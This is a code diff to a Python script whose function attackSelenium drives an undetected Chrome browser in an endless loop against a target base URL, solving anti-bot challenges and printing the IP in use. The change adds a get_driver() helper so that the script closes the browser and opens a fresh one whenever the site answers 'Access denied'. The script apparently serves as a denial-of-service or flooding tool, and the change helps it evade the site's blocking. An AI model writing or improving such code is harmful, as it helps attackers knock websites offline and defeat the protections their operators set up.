@@ -259,7 +259,7 @@ CHALLENGE_SELECTORS = [
     'td.info #js_info'
 ]
 
-def attackSelenium(baseUrl):
+def get_driver():
 	global PATCHED_DRIVER_PATH
 
 	options = uc.ChromeOptions()
@@ -317,6 +317,12 @@ def attackSelenium(baseUrl):
 	driver.get('https://api.ipify.org')
 	print('used ip is %s' % driver.page_source)
 
+	return driver
+
+def attackSelenium(baseUrl):
+
+	driver = get_driver()
+	
 	while True:
 		try:
 			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
@@ -372,6 +378,11 @@ def attackSelenium(baseUrl):
 				print('challenge solved')
 
 			print(driver.title)
+
+			if driver.title == 'Access denied':
+				driver.close()
+				driver = get_driver()
+
 			# input()
 		except Exception as err:
 			print(err)
